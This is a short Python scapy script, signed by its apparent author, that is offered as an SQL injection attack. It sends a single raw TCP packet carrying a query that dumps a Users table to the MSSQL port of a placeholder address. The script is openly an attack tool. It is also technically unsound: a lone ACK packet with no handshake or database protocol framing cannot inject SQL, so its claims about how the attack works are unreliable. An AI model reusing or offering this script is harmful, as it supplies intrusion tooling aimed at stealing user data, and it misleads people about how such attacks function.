from scapy.all import *
# Written by Lithiokride

def send_sql_injection():
    # Define the target IP and port for MSSQL
    target_ip = "192.168.1.100"  # Replace with target IP
    target_port = 1433  # Default MSSQL port

    # Craft a malicious SQL query (Example: retrieving sensitive data)
    # This assumes that the application is vulnerable to SQL injection
    sql_injection_payload = "1'; SELECT * FROM Users; --"

    # Craft the packet
    packet = (
        IP(dst=target_ip) /
        TCP(sport=12345, dport=target_port, flags="A") /
        Raw(load=sql_injection_payload)
    )

    # Send the packet
    send(packet)

    print("SQL Injection packet sent.")

# Send the SQL injection packet
send_sql_injection()
